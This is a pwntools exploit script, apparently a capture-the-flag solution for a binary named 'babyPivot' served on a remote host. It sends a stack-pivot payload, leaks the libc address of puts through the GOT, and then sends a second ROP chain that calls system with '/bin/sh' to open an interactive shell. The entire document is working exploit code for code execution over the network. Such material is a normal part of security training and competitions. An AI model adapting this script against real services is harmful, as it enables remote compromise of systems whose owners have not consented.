from pwn import *

elf = context.binary = ELF("babyPivot")
libc = ELF("babypivot-libc.so.6")

#p = process("./babyPivot")
p=remote("pwn.sh4dy.com",5006)
#gdb.attach(p)

leave_ret = 0x00000000004011e6
pop_rdi_ret = 0x00000000004012e3
ret = 0x000000000040101a
start_secret = 0x004047a0

payload1 = p64(0x0) + p64(pop_rdi_ret) + p64(elf.got.puts) + p64(elf.plt.puts) + p64(elf.sym.vuln)
payload2 = b'a'*32 + p64(start_secret) + p64(leave_ret)

for i in range(3):
    p.recvline()

p.sendline(payload1)
p.recvline()
p.send(payload2)
p.recvline()
leak=p.recvline()[:-1]
leak=leak.ljust(8,b'\x00')
leak=u64(leak)

libc.address = leak-libc.sym.puts
print(hex(libc.address))


system = libc.sym.system
binsh = libc.address+0x1b45bd   

new_start_secret = 0x004047e0   #due to stack pivot in first run, the start of stack and secret buffer coincide, hence a new pivot is taken

payload3= b'a'*63 + p64(0x0) + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system) # 63 = offset upto new pivot
payload4 = b'a'*32 + p64(new_start_secret) + p64(leave_ret)
p.recvline()
p.recvline()
p.sendline(payload3)
p.recvline()
p.send(payload4)
p.recvline()
p.interactive()
